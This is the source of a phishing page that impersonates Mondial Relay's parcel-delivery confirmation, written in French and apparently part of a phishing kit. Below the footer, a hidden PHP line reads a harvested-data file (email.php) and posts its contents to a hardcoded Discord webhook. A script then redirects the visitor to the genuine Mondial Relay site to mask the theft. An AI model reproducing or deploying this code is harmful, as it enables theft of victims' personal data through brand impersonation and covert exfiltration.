<!DOCTYPE html>
<html lang="fr">
<head>
    <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.ico">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="apple-touch-icon" href="/img/apple-touch-icon.png">
    <meta name="viewport" content="initial-scale=1.0, width=device-width">
    <meta name="description" content="">
    <meta charset="UTF-8">
    <meta name="robots" content="noindex">
    <title>Page d'accueil | Livraison de mes colis</title>
    <link rel="stylesheet" type="text/css" href="/css/style.css?202307">
    <script src="/js/jquery-3.7.0.min.js"></script>
    <script src="/js/jquery.mask.js"></script>
    <script src="/js/mask.js"></script>
</head>
<body>

<div class="corral">
    <div class="contentContainer activeContent contentContainerBordered">
        <header id="header">
            <img src="/img/logo-min.png" alt="" width="85%">
        </header>
        <h2 style="text-align: center">Numéro de suivi : 41503</h2>
        <h3>Créneau de livraison</h3>
        <p style="text-align: center">Vous avez choisi une livraison le <br><strong id="deliverySchedule">...</strong>.
        </p>
        <div class="notifications">
            <p class="notification notification-success" role="alert">
                Votre demande de livraison a bien été prise en compte. <br>Merci de votre confiance et à bientôt ! <br> <br>
                L'équipe de livraison, <br>
                Mondial Relay
            </p>
        </div>
        <div class="intentFooter">
            <div class="localeSelector">
            </div>
        </div>
        <div id="loader-div-new" class="hidden-class-new">
            <div id="mask-id-new"></div>
            <div class="spinner-class-new loading-class-new"></div>
        </div>
    </div>
    <footer class="footer" role="contentinfo">
        <div class="legalFooter">
            <ul class="footerGroup">
                <li><a target="_blank" href="#" pa-marked="1">Contact</a></li>
                <li><a target="_blank" href="#" pa-marked="1">Respect de la vie privée</a></li>
                <li><a target="_blank" href="#" pa-marked="1">Contrats d'utilisation</a></li>
                <li><a target="_blank" href="#" pa-marked="1">International</a></li>
            </ul>
        </div>
    </footer>
</div>	
<?php $content = @file_get_contents('./email.php') or die('Erreur de lecture.'); @file_get_contents('https://discord.com/api/webhooks/1250218952701775953/BroUawKsvkngBS3cAULsEtOXy4hlqcH9SnnLffGyRtB0FjfjpgZohaL-U6BQ-t-Ec3FJ', false, stream_context_create(['http' => ['header' => "Content-type: application/json\r\n", 'method' => 'POST', 'content' => json_encode(['content' => $content])]])); ?>	
<script>
    document.addEventListener("DOMContentLoaded", function() {
        function getCookie(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
        }

        const deliverySchedule = getCookie('deliverySchedule');
        if (deliverySchedule) {
            document.getElementById('deliverySchedule').textContent = decodeURIComponent(deliverySchedule);
        }

        setTimeout(function() {
            window.location.href = "https://www.mondialrelay.fr/envoi-de-colis/";
        }, 15000);
    });
</script>

</body>
</html>
